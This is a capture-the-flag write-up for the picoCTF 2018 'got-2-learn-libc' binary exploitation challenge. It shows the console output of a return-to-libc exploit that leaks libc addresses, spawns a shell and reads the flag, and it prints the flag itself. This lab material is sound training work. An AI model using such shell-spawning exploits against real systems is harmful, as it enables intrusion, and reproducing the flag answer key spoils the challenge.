# got-2-learn-libc - Points: 250 - (Solves: 113)

This [program][1] gives you the address of some system calls.
Can you get a shell?
You can find the program in /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee on the shell server.
Source.

[1]: https://2018shell2.picoctf.com/static/19aaaa33336df68d8e1412b4bed1164e/vuln
[2]: https://2018shell2.picoctf.com/static/19aaaa33336df68d8e1412b4bed1164e/vuln.c

## Hints

- try returning to systems calls to leak information
- don't forget you can always return back to main()

---

```sh
% python xpwn.py
[+] Starting local process '/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln': pid 1669422
[*] puts is at    : 0xf7649140
[*] libc base     : 0xf76027c0
[*] system is at  : 0xf7624940
[*] exit is at    : 0xf76187b0
[*] /bin/sh is at : 0x565c1030
[+] Here comes the shell!
[*] Switching to interactive mode
total 16
-r--r----- 1 hacksports got-2-learn-libc_2   37 Sep 28 07:48 flag.txt
-rwxr-sr-x 1 hacksports got-2-learn-libc_2 7856 Sep 28 07:48 vuln
-rw-rw-r-- 1 hacksports hacksports          843 Sep 28 07:48 vuln.c
$ cat flag.txt
picoCTF{syc4al1s_4rE_uS3fUl_bd99244d}$
[*] Stopped process '/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln' (pid 1669422)
```

picoCTF{syc4al1s_4rE_uS3fUl_bd99244d}$
